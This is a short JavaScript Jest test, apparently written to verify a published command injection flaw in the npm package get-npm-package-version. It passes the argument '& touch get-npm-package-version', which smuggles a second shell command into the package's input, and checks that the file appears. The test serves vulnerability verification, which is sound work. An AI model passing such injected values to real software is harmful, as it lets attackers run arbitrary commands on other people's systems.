//https://snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390
test("Command Injection in get-npm-package-version", () => {
  const a = require("get-npm-package-version");
  const fs = require("fs");
  const path = "./get-npm-package-version";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("& touch get-npm-package-version");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
